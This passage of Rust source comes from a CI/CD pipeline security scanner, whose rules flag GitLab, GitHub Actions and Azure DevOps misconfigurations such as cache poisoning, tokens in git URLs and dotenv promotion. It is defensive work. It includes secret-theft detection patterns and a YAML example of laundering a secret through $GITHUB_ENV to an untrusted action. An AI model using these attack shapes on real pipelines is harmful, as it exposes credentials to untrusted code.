                "Security-scanner job '{}' ({how}) runs with allow_failure: true — when the scan errors out the pipeline still goes green; reviewers trust a badge that is no longer evidence",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Either drop `allow_failure: true` and let the scanner gate the pipeline, OR add a follow-up `rules:` clause that surfaces the failure (e.g. a stage that asserts the scan report exists and is non-empty). A scanner that fails closed is worth more than a scanner that fails silently.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Rule: `child_pipeline_trigger_inherits_authority` (Medium, Propagation).
///
/// A GitLab `trigger:` job (downstream / child pipeline) either runs in
/// `merge_request_event` context OR is a *dynamic* child pipeline whose
/// included YAML comes from a previous job's `artifact:`. Both shapes mean
/// untrusted input shapes the pipeline that runs with the parent project's
/// CI_JOB_TOKEN and secrets.
pub fn child_pipeline_trigger_inherits_authority(graph: &AuthorityGraph) -> Vec<Finding> {
    let graph_is_mr = graph
        .metadata
        .get(META_TRIGGER)
        .map(|v| v == "merge_request")
        .unwrap_or(false);

    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let kind = match step.metadata.get(META_GITLAB_TRIGGER_KIND) {
            Some(k) => k.as_str(),
            None => continue,
        };

        let is_dynamic = kind == "dynamic";
        let is_mr = graph_is_mr;

        if !is_dynamic && !is_mr {
            continue;
        }

        let mut reasons: Vec<&str> = Vec::new();
        if is_dynamic {
            reasons.push("includes child YAML from a previous job's artifact (dynamic child pipeline — code-injection sink)");
        }
        if is_mr {
            reasons.push(
                "runs in merge_request_event context — fork code shapes the downstream pipeline",
            );
        }
        let why = reasons.join(" AND ");

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::ChildPipelineTriggerInheritsAuthority,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Trigger job '{}' {why}; the downstream pipeline inherits the parent project's CI_JOB_TOKEN and any reachable secrets",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "For dynamic child pipelines: validate the generated YAML against a schema before triggering, or pre-stage all child pipeline files in-tree and use `include:` (static) instead of `include: artifact:`. For MR-triggered triggers: gate the downstream with `rules: if: $CI_PIPELINE_SOURCE != 'merge_request_event'` so fork PRs cannot reach it.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Heuristic: cache keys that cross trust boundaries. Returns `Some(reason)`
/// when the key is one of the dangerous shapes, `None` when the key is
/// scoped tightly enough.
fn unsafe_cache_key(key: &str) -> Option<&'static str> {
    let trimmed = key.trim();
    if trimmed.is_empty() {
        // GitLab default key when none is set: `default` — same blast radius as hardcoded.
        return Some("absent (defaults to a single shared 'default' key per runner)");
    }
    // CI_JOB_NAME alone — same name across MR + main = shared key.
    if trimmed == "$CI_JOB_NAME"
        || trimmed == "${CI_JOB_NAME}"
        || trimmed.eq_ignore_ascii_case("$ci_job_name")
    {
        return Some(
            "`$CI_JOB_NAME` only — same name on MR and default-branch jobs share the cache",
        );
    }
    // CI_COMMIT_REF_SLUG alone — handled by caller (depends on policy).
    // Otherwise: any key without a $-interpolation is hardcoded → shared.
    if !trimmed.contains('$') {
        return Some("hardcoded — every job and every branch share the same cache");
    }
    None
}

/// Rule: `cache_key_crosses_trust_boundary` (Medium, Supply Chain).
///
/// A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME`
/// only, or `$CI_COMMIT_REF_SLUG` *without* a `policy: pull` restriction.
/// Caches are stored per-runner keyed by `key:` — a poisoned MR can push a
/// malicious `node_modules/` cache that the next default-branch job
/// downloads and executes.
pub fn cache_key_crosses_trust_boundary(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let key = match step.metadata.get(META_GITLAB_CACHE_KEY) {
            Some(k) => k,
            None => continue,
        };
        let policy = step
            .metadata
            .get(META_GITLAB_CACHE_POLICY)
            .map(|s| s.as_str())
            .unwrap_or("pull-push"); // GitLab's runtime default

        // pull-only consumers cannot poison the cache — skip those
        let is_pull_only = matches!(policy, "pull");

        let trimmed = key.trim();

        // Per-ref key: $CI_COMMIT_REF_SLUG. Safe ONLY when the consuming jobs
        // restrict themselves to `policy: pull`. Without that restriction, an
        // MR job pushes a cache the next protected-branch job downloads
        // (refs are *namespaced* but not *isolated* — the same key on `main`
        // shadows over time and the runner's per-key store is shared).
        let is_ref_slug = trimmed == "$CI_COMMIT_REF_SLUG"
            || trimmed == "${CI_COMMIT_REF_SLUG}"
            || trimmed.eq_ignore_ascii_case("$ci_commit_ref_slug");
        if is_ref_slug {
            if !is_pull_only {
                findings.push(Finding {
                    severity: Severity::Medium,
                    category: FindingCategory::CacheKeyCrossesTrustBoundary,
                    path: None,
                    nodes_involved: vec![step.id],
                    message: format!(
                        "Step '{}' uses cache key `$CI_COMMIT_REF_SLUG` with policy `{policy}` — MR jobs can push poisoned caches that subsequent default-branch jobs restore (npm install / Maven plugin resolution executes cached artifacts)",
                        step.name
                    ),
                    recommendation: Recommendation::Manual {
                        action: "Set `policy: pull` on jobs that consume the cache from a different trust context (default-branch, protected refs), and restrict `policy: push` to a dedicated job that runs only on protected branches. Combine with `key: { files: [package-lock.json] }` so cache reuse requires identical input hashes.".into(),
                    },
                    source: FindingSource::BuiltIn,
                    extras: FindingExtras::default(),
                });
            }
            continue;
        }

        if let Some(reason) = unsafe_cache_key(key) {
            findings.push(Finding {
                severity: Severity::Medium,
                category: FindingCategory::CacheKeyCrossesTrustBoundary,
                path: None,
                nodes_involved: vec![step.id],
                message: format!(
                    "Step '{}' has cache key `{key}` ({reason}) with policy `{policy}` — caches cross trust boundaries; an MR or fork can stage a poisoned cache that the next protected-branch job restores and executes",
                    step.name
                ),
                recommendation: Recommendation::Manual {
                    action: "Scope the cache key to inputs only an authorized run can produce, e.g. `key: { files: [package-lock.json] }` so the key changes when dependencies change, and combine with `policy: pull` on consumers in higher trust contexts.".into(),
                },
                source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
            });
        }
    }

    findings
}

/// Local view-struct mirroring `taudit_parse_gitlab::IncludeEntry` — kept here
/// so taudit-core does not depend on taudit-parse-gitlab. The two crates pass
/// data only through the JSON blob in `META_GITLAB_INCLUDES`.
mod taudit_parse_gitlab_include_view {
    use serde::Deserialize;
    #[derive(Debug, Clone, Deserialize)]
    pub struct IncludeView {
        pub kind: String,
        pub target: String,
        pub git_ref: String,
    }
}

/// Rule: a CI script body constructs an HTTPS git URL with credentials
/// embedded directly in the URL (`https://user:$TOKEN@host/...`) and
/// invokes git against it (`git clone`, `git push`, `git remote set-url`,
/// `git fetch`, `git ls-remote`).
///
/// Detection: scan `META_SCRIPT_BODY` for the regex equivalent
/// `https://[^/\s'"]*:\$\{?[A-Z0-9_]*(TOKEN|PAT|PASSWORD|PASSWD|KEY|SECRET)[A-Z0-9_]*\}?@`
/// implemented byte-by-byte to keep the dependency surface minimal.
///
/// Severity: **High**. Embedded credentials persist in `.git/config`,
/// are visible to every subsequent process via `ps`/`/proc/*/cmdline`,
/// land in `GIT_TRACE` output when set, and may be uploaded as part of
/// any artifact that bundles the workspace.
pub fn pat_embedded_in_git_remote_url(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.trim().is_empty() => b,
            _ => continue,
        };

        let hits = find_credential_embedded_git_urls(body);
        if hits.is_empty() {
            continue;
        }

        // Cap message previews so we don't spam logs with huge URLs.
        let preview: String = hits
            .iter()
            .take(2)
            .map(|s| s.as_str())
            .collect::<Vec<_>>()
            .join(", ");
        let suffix = if hits.len() > 2 {
            format!(", and {} more", hits.len() - 2)
        } else {
            String::new()
        };

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::PatEmbeddedInGitRemoteUrl,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' embeds a credential variable directly in a git remote URL ({}{}). The token value is exposed in process argv (visible to `ps`), persists in .git/config for the rest of the job, and is captured by GIT_TRACE if enabled.",
                step.name, preview, suffix
            ),
            recommendation: Recommendation::Manual {
                action: "Use a credential helper or env-var-based authentication instead of inlining the token in the URL. For GitLab CI, prefer `git -c http.extraHeader=\"PRIVATE-TOKEN: $PAT_TOKEN\" push <url>`, or set `CI_JOB_TOKEN` as the credential helper. Never construct `https://user:$TOKEN@host/...` URLs.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Find substrings in `body` that look like
/// `https://<userpart>:<token-var-ref>@host`. Returns up to 8 unique hits
/// (stable order). The token variable is required to look like a credential
/// name (TOKEN/PAT/PASSWORD/PASSWD/KEY/SECRET) — bare `$VAR` references
/// without a credential-shaped name don't fire to keep the false-positive
/// rate down.
fn find_credential_embedded_git_urls(body: &str) -> Vec<String> {
    let mut hits: Vec<String> = Vec::new();
    let bytes = body.as_bytes();
    let mut i = 0usize;
    let needle = b"https://";

    while i + needle.len() <= bytes.len() {
        if &bytes[i..i + needle.len()] != needle {
            i += 1;
            continue;
        }
        // Find the end of the URL "authority" component — terminator is the
        // next `/`, whitespace, quote, or end-of-string.
        let mut end = i + needle.len();
        while end < bytes.len() {
            let c = bytes[end];
            if c == b'/'
                || c == b' '
                || c == b'\t'
                || c == b'\n'
                || c == b'\r'
                || c == b'"'
                || c == b'\''
                || c == b'`'
            {
                break;
            }
            end += 1;
        }
        let authority = &body[i + needle.len()..end];

        if url_authority_has_embedded_credential_var(authority) {
            // Capture the full URL up to the path delimiter for the message.
            let urlend = end;
            let url = &body[i..urlend];
            let url_short = if url.len() > 120 {
                format!("{}…", &url[..120])
            } else {
                url.to_string()
            };
            if !hits.contains(&url_short) {
                hits.push(url_short);
                if hits.len() == 8 {
                    break;
                }
            }
        }

        i = end.max(i + 1);
    }

    hits
}

/// Decide whether a URL's authority component (everything after `https://`
/// and before the path) contains a credential-shaped variable reference of
/// the form `user:$TOKEN_NAME@host` or `user:${TOKEN_NAME}@host`.
fn url_authority_has_embedded_credential_var(authority: &str) -> bool {
    // Must contain both ':' and '@' with ':' before '@'.
    let at = match authority.find('@') {
        Some(p) => p,
        None => return false,
    };
    let userinfo = &authority[..at];
    let colon = match userinfo.find(':') {
        Some(p) => p,
        None => return false,
    };
    let pw_part = &userinfo[colon + 1..];
    if pw_part.is_empty() {
        return false;
    }
    // Strip optional `${...}` braces so we can inspect the variable name.
    let pw_inner = pw_part.trim_start_matches('$');
    let pw_inner = pw_inner.trim_start_matches('{').trim_end_matches('}');
    // Variable name must look like an env var (uppercase, digits, underscores)
    // and contain a credential-shaped fragment.
    if pw_inner.is_empty() {
        return false;
    }
    let looks_like_var = pw_inner
        .chars()
        .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_');
    if !looks_like_var {
        return false;
    }
    const CRED_FRAGMENTS: &[&str] = &[
        "TOKEN", "PAT", "PASSWORD", "PASSWD", "KEY", "SECRET", "CRED",
    ];
    CRED_FRAGMENTS.iter().any(|frag| pw_inner.contains(frag))
}

/// Rule: a CI script triggers a different project's pipeline via the GitLab
/// REST API using `CI_JOB_TOKEN` and forwards variables via the
/// `variables[KEY]=value` query/form parameter. Cross-project authority
/// bridge — the downstream project's security depends on the trust contract
/// between the two projects, and variable values flowing across that
/// boundary may originate from MR/fork context the attacker controls.
///
/// Severity: **Medium**. Higher-risk when the triggering job runs on MR
/// pipelines (`META_TRIGGER == "merge_request"`) — the message annotates
/// that case explicitly so operators see the elevated risk.
pub fn ci_token_triggers_downstream_with_variable_passthrough(
    graph: &AuthorityGraph,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let pipeline_is_mr_triggered = graph
        .metadata
        .get(META_TRIGGER)
        .map(|t| t == "merge_request")
        .unwrap_or(false);

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.trim().is_empty() => b,
            _ => continue,
        };

        if !script_triggers_downstream_with_passthrough(body) {
            continue;
        }

        let suffix = if pipeline_is_mr_triggered {
            " (pipeline triggered on merge_request — variable values may originate from attacker-controlled MR context)"
        } else {
            ""
        };

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::CiTokenTriggersDownstreamWithVariablePassthrough,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' triggers a downstream pipeline via the GitLab REST API using CI_JOB_TOKEN and forwards variables[…] in the request — this is a cross-project authority channel that bypasses the parent-child trust model{}",
                step.name, suffix
            ),
            recommendation: Recommendation::Manual {
                action: "Constrain which variables the downstream pipeline accepts (use `variables.X.expand: false` and explicit allowlists), prefer pipeline triggers via `trigger:` keyword with `strategy: depend` over `curl … CI_JOB_TOKEN …`, and audit the receiving project's CI/CD settings to ensure it does not honour caller-supplied variables on protected refs.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Returns true if `body` contains a `curl` (or wget) call that hits a
/// GitLab `/trigger/pipeline` endpoint with both `CI_JOB_TOKEN` and a
/// `variables[…]` field. We accept either query-string form
/// (`variables[X]=...`) or form-data form (`-F "variables[X]=..."`).
fn script_triggers_downstream_with_passthrough(body: &str) -> bool {
    let lower = body.to_lowercase();
    // Match a triggering call: must mention `trigger/pipeline` and reference
    // CI_JOB_TOKEN, plus carry a `variables[` token.
    let trigger_endpoint = lower.contains("trigger/pipeline")
        || lower.contains("/api/v4/projects/") && lower.contains("/trigger");
    if !trigger_endpoint {
        return false;
    }
    let has_token = lower.contains("ci_job_token");
    if !has_token {
        return false;
    }
    body.contains("variables[")
}

/// Rule: a job emits an `artifacts.reports.dotenv: <file>` artifact whose
/// contents become pipeline variables for any consumer linked via `needs:`
/// or `dependencies:`. A consumer in a later stage that targets a
/// production-named environment inherits those variables transparently.
/// Producer-side risk amplifies when the script reads attacker-influenced
/// inputs (`CI_COMMIT_REF_NAME`, `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`,
/// `CI_COMMIT_TAG`, branch/commit derived strings).
///
/// Severity: **High** when a producer→consumer chain exists with a
/// production-like environment on the consumer; **Medium** when the chain
/// exists but no production environment is detected (still a covert
/// variable-promotion channel).
pub fn dotenv_artifact_flows_to_privileged_deployment(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Build (producer name -> producer step id, dotenv file) index.
    let mut producers: std::collections::HashMap<String, (NodeId, String)> =
        std::collections::HashMap::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        if let Some(file) = step.metadata.get(META_DOTENV_FILE) {
            if let Some(job) = step.metadata.get(META_JOB_NAME) {
                producers.insert(job.clone(), (step.id, file.clone()));
            }
        }
    }
    if producers.is_empty() {
        return findings;
    }

    for consumer in graph.nodes_of_kind(NodeKind::Step) {
        let needs_csv = match consumer.metadata.get(META_NEEDS) {
            Some(s) if !s.is_empty() => s,
            _ => continue,
        };
        let upstream_jobs: Vec<&str> = needs_csv.split(',').filter(|s| !s.is_empty()).collect();
        let matched: Vec<&(NodeId, String)> = upstream_jobs
            .iter()
            .filter_map(|j| producers.get(*j))
            .collect();
        if matched.is_empty() {
            continue;
        }

        let env_name = consumer
            .metadata
            .get(META_ENVIRONMENT_NAME)
            .map(String::as_str)
            .unwrap_or("");
        // Production-like signal: explicit `environment.name:` value, OR
        // (fallback) the job name itself encodes a production marker.
        // GitLab pipelines often skip the explicit `environment:` block
        // and rely on stage/job naming conventions like `deploy-prod`.
        let consumer_job = consumer
            .metadata
            .get(META_JOB_NAME)
            .map(String::as_str)
            .unwrap_or(consumer.name.as_str());
        let production_like =
            is_production_environment(env_name) || is_production_environment(consumer_job);

        // Decide elevation: production-like consumer environment OR
        // producer script ingests attacker-influenced CI variables.
        let producer_uses_untrusted_input = matched.iter().any(|(pid, _)| {
            graph
                .node(*pid)
                .and_then(|n| n.metadata.get(META_SCRIPT_BODY))
                .map(|b| script_uses_attacker_influenced_ci_var(b))
                .unwrap_or(false)
        });

        if !production_like && !producer_uses_untrusted_input {
            continue; // benign dotenv flow — skip
        }

        let severity = if production_like {
            Severity::High
        } else {
            Severity::Medium
        };

        let producer_names: Vec<String> = upstream_jobs
            .iter()
            .filter(|j| producers.contains_key(**j))
            .map(|s| (*s).to_string())
            .collect();

        let env_suffix = if production_like {
            if env_name.is_empty() {
                format!(" targeting production-like job name '{consumer_job}'")
            } else {
                format!(" targeting production-like environment '{env_name}'")
            }
        } else {
            String::new()
        };
        let trust_suffix = if producer_uses_untrusted_input {
            " (producer script reads attacker-influenced CI variables — branch/MR-source names propagate into the dotenv values)"
        } else {
            ""
        };

        let mut nodes_involved = vec![consumer.id];
        nodes_involved.extend(matched.iter().map(|(id, _)| *id));

        findings.push(Finding {
            severity,
            category: FindingCategory::DotenvArtifactFlowsToPrivilegedDeployment,
            path: None,
            nodes_involved,
            message: format!(
                "Step '{}' consumes a dotenv artifact from upstream job(s) [{}]{}{} — variables defined in the upstream's `artifacts.reports.dotenv` are silently promoted to the pipeline variable namespace, indistinguishable from pipeline-level variables in subsequent jobs",
                consumer.name,
                producer_names.join(", "),
                env_suffix,
                trust_suffix
            ),
            recommendation: Recommendation::Manual {
                action: "Treat dotenv outputs as untrusted: pin the producer to a protected branch/tag context only, validate variable values in the consumer before use, and prefer explicit `needs:[…].artifacts: false` plus pipeline-scoped variables for deployment selection. Never let dotenv-promoted values choose service connections, deploy targets, or registry destinations without an allowlist check.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// True when an environment name matches common production-like patterns.
fn is_production_environment(name: &str) -> bool {
    if name.is_empty() {
        return false;
    }
    let lower = name.to_lowercase();
    const TOKENS: &[&str] = &["prod", "production", "prd", "live"];
    for token in TOKENS {
        // Match either as a whole word or a `/`-separated segment, e.g.
        // `production/eu-west-1`, `prod-cluster`.
        if lower == *token {
            return true;
        }
        if lower.starts_with(&format!("{token}-"))
            || lower.starts_with(&format!("{token}/"))
            || lower.contains(&format!("/{token}/"))
            || lower.contains(&format!("-{token}-"))
            || lower.ends_with(&format!("/{token}"))
            || lower.ends_with(&format!("-{token}"))
        {
            return true;
        }
    }
    false
}

/// True when an inline script reads CI variables that carry attacker-controllable
/// content (branch names, MR source/target refs, tag refs, commit messages).
fn script_uses_attacker_influenced_ci_var(script: &str) -> bool {
    const NEEDLES: &[&str] = &[
        "CI_COMMIT_REF_NAME",
        "CI_COMMIT_BRANCH",
        "CI_COMMIT_TAG",
        "CI_COMMIT_MESSAGE",
        "CI_COMMIT_TITLE",
        "CI_COMMIT_DESCRIPTION",
        "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME",
        "CI_MERGE_REQUEST_TITLE",
        "CI_MERGE_REQUEST_DESCRIPTION",
    ];
    NEEDLES.iter().any(|n| script.contains(n))
}

/// Rule: secret laundered through `$GITHUB_ENV` reaches an untrusted consumer
/// in the same job — composition gap between `self_mutating_pipeline` (the
/// gate-write detector) and `untrusted_with_authority` (the direct-access
/// detector).
///
/// **Pattern (R2 attack #3):**
/// ```yaml
/// jobs:
///   build:
///     steps:
///       - name: setup
///         run: echo "CLOUD_KEY=${{ secrets.CLOUD_KEY }}" >> $GITHUB_ENV   # writer
///       - uses: some-org/deploy@main                                        # untrusted
///         with:
///           key: ${{ env.CLOUD_KEY }}                                       # consumer
/// ```
/// The writer trips `self_mutating_pipeline`. The consumer never gets a
/// `HasAccessTo` edge to `CLOUD_KEY` (the value is sourced from the runner
/// env, not the secrets store) so neither `untrusted_with_authority` nor
/// `authority_propagation` fire — the env-gate launders the trust zone.
///
/// **Detection:** for every Step in the same job:
///   - Writer: `META_WRITES_ENV_GATE = "true"` AND has `HasAccessTo` to a
///     Secret/Identity (the value being laundered must derive from authority)
///   - Consumer: appears later in the job (NodeId order tracks declaration
///     order), trust zone is `Untrusted` or `ThirdParty`, and carries
///     `META_READS_ENV = "true"` (stamped by the parser when the step
///     references `${{ env.X }}` in `with:` / `run:`)
///
/// Same-job constraint enforced via `META_JOB_NAME` — the env gate only
/// propagates within a job, so cross-job pairs are not flagged.
pub fn secret_via_env_gate_to_untrusted_consumer(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Step 1: enumerate writer-with-secret nodes, paired with the laundered
    // authority names so the finding message can name them. We capture the
    // node id in declaration order so the same-job ordering check below is a
    // simple comparison rather than an O(n²) scan.
    struct Writer<'a> {
        id: NodeId,
        job: &'a str,
        name: &'a str,
        secrets: Vec<&'a str>,
    }
    let writers: Vec<Writer<'_>> = graph
        .nodes_of_kind(NodeKind::Step)
        .filter(|step| {
            step.metadata
                .get(META_WRITES_ENV_GATE)
                .map(|v| v == "true")
                .unwrap_or(false)
        })
        .filter_map(|step| {
            let job = step.metadata.get(META_JOB_NAME)?.as_str();
            // Must hold authority — collect Secret/Identity names reachable
            // via HasAccessTo. An env-gate write that doesn't carry any
            // authority is the harmless "ECHO ROUTE=/api >> $GITHUB_ENV"
            // case; not in scope for this rule.
            let secrets: Vec<&str> = graph
                .edges_from(step.id)
                .filter(|e| e.kind == EdgeKind::HasAccessTo)
                .filter_map(|e| graph.node(e.to))
                .filter(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
                .map(|n| n.name.as_str())
                .collect();
            if secrets.is_empty() {
                return None;
            }
            Some(Writer {
                id: step.id,
                job,
                name: step.name.as_str(),
                secrets,
            })
        })
        .collect();

    if writers.is_empty() {
        return findings;
    }

    // Step 2: for every consumer step that reads env, find the writer(s) it
    // could be laundering from.
    for consumer in graph.nodes_of_kind(NodeKind::Step) {
        // Consumer must read the runner env.
        let reads_env = consumer
            .metadata
            .get(META_READS_ENV)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !reads_env {
            continue;
        }

        // Consumer must run with reduced trust — first-party readers are
        // already accounted for elsewhere and would be a high-FP class.
        if !matches!(
            consumer.trust_zone,
            TrustZone::Untrusted | TrustZone::ThirdParty
        ) {
            continue;
        }

        let consumer_job = match consumer.metadata.get(META_JOB_NAME) {
            Some(j) => j.as_str(),
            None => continue,
        };

        // Find writers in the same job that appear earlier (NodeId order
        // mirrors declaration order — see GHA parser, ADO parser).
        let upstream: Vec<&Writer<'_>> = writers
            .iter()
            .filter(|w| w.job == consumer_job && w.id < consumer.id)
            .collect();

        if upstream.is_empty() {
            continue;
        }

        // Aggregate the laundered authority names across all writers so
        // operators see the full set of credentials potentially reaching
        // the untrusted step. Stable ordering, dedup'd.
        let mut secret_labels: Vec<&str> = upstream
            .iter()
            .flat_map(|w| w.secrets.iter().copied())
            .collect();
        secret_labels.sort_unstable();
        secret_labels.dedup();
        let writer_names: Vec<&str> = upstream.iter().map(|w| w.name).collect();

        let mut nodes_involved = vec![consumer.id];
        nodes_involved.extend(upstream.iter().map(|w| w.id));
        // Include the laundered Secret/Identity nodes themselves so the
        // fingerprint and downstream consumers can attribute the finding
        // to a specific credential.
        for w in &upstream {
            for e in graph.edges_from(w.id) {
                if e.kind == EdgeKind::HasAccessTo
                    && graph
                        .node(e.to)
                        .map(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
                        .unwrap_or(false)
                    && !nodes_involved.contains(&e.to)
                {
                    nodes_involved.push(e.to);
                }
            }
        }

        findings.push(Finding {
            severity: Severity::Critical,
            category: FindingCategory::SecretViaEnvGateToUntrustedConsumer,
            path: None,
            nodes_involved,
            message: format!(
                "Untrusted consumer '{}' in job '{}' reads from $GITHUB_ENV after step(s) [{}] laundered authority [{}] through the env gate — secret reaches untrusted code without ever appearing in a HasAccessTo edge",
                consumer.name,
                consumer_job,
                writer_names.join(", "),
                secret_labels.join(", "),
            ),
            recommendation: Recommendation::Manual {
                action: "Pass the secret to the consuming step via an explicit `env:` mapping on that step (so the relationship is graph-visible) instead of writing it to `$GITHUB_ENV` for ambient pickup. If the consumer is a third-party action, pin it to a 40-char SHA before exposing any secret-derived value to it.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

// ── Positive invariants (negative-space rules) ───────────────────
//
// These rules fire on the ABSENCE of an expected defensive control rather
// than on the presence of a misconfigured one. They are derived from the
// blue-team corpus defense report — patterns observed across thousands of
// pipelines where the well-defended workflows had a control the others were
// missing.
//
// Each function gates strictly on `META_PLATFORM` so a single pipeline file
// is only evaluated by the rules that apply to its source platform.

/// Returns true when a graph belongs to the named platform. Falls back to
/// false (rule no-ops) when no platform stamp is present — keeps existing
/// hand-built test graphs from accidentally tripping platform-scoped rules.
fn graph_is_platform(graph: &AuthorityGraph, platform: &str) -> bool {
    graph
        .metadata
        .get(META_PLATFORM)
        .map(|p| p == platform)
        .unwrap_or(false)
}

/// Rule: GHA workflow declares no top-level `permissions:` block AND no
/// per-job permissions block. With nothing declared, `GITHUB_TOKEN` falls
/// back to the broad platform default (`contents: write`, `packages: write`,
/// metadata read, etc.) on every trigger. Explicit declarations make the
/// blast radius legible to the next reviewer; absence makes it invisible.
///
/// Detection:
///   * `META_PLATFORM == "github-actions"` (gates ADO/GitLab out)
///   * Graph carries `META_NO_WORKFLOW_PERMISSIONS == "true"` (parser-set
///     when `workflow.permissions` is absent)
///   * No Identity node whose name starts with `GITHUB_TOKEN (` (those are
///     the per-job override identities the parser creates when a job
///     declares its own permissions block)
///
/// Severity: Medium. Not a direct exploit path on its own but compounds
/// every other finding in the same workflow.
pub fn no_workflow_level_permissions_block(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let no_workflow_perms = graph
        .metadata
        .get(META_NO_WORKFLOW_PERMISSIONS)
        .map(|v| v == "true")
        .unwrap_or(false);
    if !no_workflow_perms {
        return Vec::new();
    }
    // Empty graphs (variable-only YAML files mis-detected as GHA, parse
    // failures that left the graph empty, etc.) carry no real authority
    // surface to be over-broad over. Skip them. A real workflow always
    // produces at least one Step node.
    if graph.nodes_of_kind(NodeKind::Step).next().is_none() {
        return Vec::new();
    }
    // Per-job permissions blocks create Identity nodes named
    // `GITHUB_TOKEN (<job_name>)`. If any exists, the workflow has at least
    // one job-scoped permissions block — don't fire.
    let has_job_level_perms = graph.nodes_of_kind(NodeKind::Identity).any(|n| {
        n.name.starts_with("GITHUB_TOKEN (")
            || (n.name == "GITHUB_TOKEN" && n.metadata.contains_key(META_PERMISSIONS))
    });
    if has_job_level_perms {
        return Vec::new();
    }
    // ISC-20: anchor the per-workflow finding on the GITHUB_TOKEN
    // Identity node when present (the natural authority surface of the
    // missing permissions block); fall back to a literal anchor string
    // so single-finding-per-file rules still produce stable fingerprints
    // when the parser hasn't synthesised a token node.
    let token_node: Vec<NodeId> = graph
        .nodes_of_kind(NodeKind::Identity)
        .find(|n| n.name == "GITHUB_TOKEN" || n.name.starts_with("GITHUB_TOKEN"))
        .map(|n| vec![n.id])
        .unwrap_or_default();
    vec![Finding {
        severity: Severity::Medium,
        category: FindingCategory::NoWorkflowLevelPermissionsBlock,
        path: None,
        nodes_involved: token_node,
        message: "Workflow declares no top-level or per-job `permissions:` block — GITHUB_TOKEN \
             falls back to the broad platform default (contents: write, packages: write, …) \
             on every trigger. Explicit permissions make the blast radius legible to triage."
            .into(),
        recommendation: Recommendation::ReducePermissions {
            current: "platform default (broad)".into(),
            minimum: "permissions: {} at top level, then add the minimum per-job — e.g. \
                      `permissions: { contents: read }`"
                .into(),
        },
        source: FindingSource::BuiltIn,
        extras: FindingExtras::with_anchor("workflow_default_permissions"),
    }]
}

/// Rule: ADO job referencing a production-named service connection has no
/// `environment:` binding. Strictly broader than
/// `terraform_auto_approve_in_prod` — fires on any prod-SC step (Terraform,
/// ARM, AzureCLI, AzurePowerShell, custom) whose enclosing job lacks the
/// approval gate, regardless of whether `-auto-approve` is set.
///
/// Detection (per Step):
///   * `META_PLATFORM == "azure-devops"`
///   * Step carries `META_SERVICE_CONNECTION_NAME` matching prod pattern,
///     OR an `Identity` connected via `HasAccessTo` whose name matches
///     the same pattern AND carries `META_SERVICE_CONNECTION == "true"`.
///   * Step does NOT carry `META_ENV_APPROVAL` (parser tags every step
///     inside an environment-bound deployment job).
///
/// One finding per matching step (matching `terraform_auto_approve_in_prod`
/// granularity). Severity: High.
pub fn prod_deploy_job_no_environment_gate(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "azure-devops") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let env_gated = step
            .metadata
            .get(META_ENV_APPROVAL)
            .map(|v| v == "true")
            .unwrap_or(false);
        if env_gated {
            continue;
        }
        let direct = step.metadata.get(META_SERVICE_CONNECTION_NAME).cloned();
        let edge_conn = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .find(|n| {
                n.kind == NodeKind::Identity
                    && n.metadata
                        .get(META_SERVICE_CONNECTION)
                        .map(|v| v == "true")
                        .unwrap_or(false)
            })
            .map(|n| n.name.clone());
        let conn_name = match direct.or(edge_conn) {
            Some(n) if looks_like_prod_connection(&n) => n,
            _ => continue,
        };
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::ProdDeployJobNoEnvironmentGate,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' targets production service connection '{}' but its job has no \
                 `environment:` binding — every pipeline trigger applies changes with no \
                 approval queue and no entry in the ADO Environments audit trail",
                step.name, conn_name
            ),
            recommendation: Recommendation::Manual {
                action: "Move the step into a deployment job whose `environment:` is configured \
                         with required approvers in ADO. Even if `-auto-approve` is acceptable \
                         (e.g. `terraform apply tfplan`), the environment binding gives the \
